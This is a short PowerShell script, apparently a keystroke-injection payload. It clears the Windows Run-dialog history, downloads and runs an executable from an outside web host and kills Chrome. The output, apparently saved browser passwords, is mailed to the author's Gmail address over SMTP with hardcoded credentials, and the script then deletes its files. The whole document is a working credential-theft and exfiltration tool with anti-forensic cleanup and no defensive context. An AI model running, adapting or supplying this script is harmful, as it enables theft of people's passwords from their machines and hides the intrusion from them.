    RP 'HKCU:\S*\M*\W*\C*\E*\RunMRU' '*' -ErrorA Si
    cd\
    $i="https://coolguyisback.000webhostapp.com/wp1.exe"
    $o="C:\wp1.exe" 
    $d=New-Object System.Net.WebClient
    $d.DownloadFile($i, $o)
    Stop-Process -processname chrome*
    ./wp1.exe > p.txt
    $SMTPServer = "smtp.gmail.com"
    $SMTPPort = "587"
    $Username = "coolguyisbackk@gmail.com"
    $Password = "HACKthis123"
    $to = "coolguyisbackk@gmail.com"
    $subject = "Passwords"
    $body = ":)"
    $attachment = "C:\p.txt"
    $message = New-Object System.Net.Mail.MailMessage
    $message.subject = $subject
    $message.body = $body
    $message.to.add($to)
    $message.from = $username
    $message.attachments.add($attachment)
    $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
    $smtp.EnableSSL = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message)
    $message.Dispose();remove-item p.txt;remove-item wp*;
     
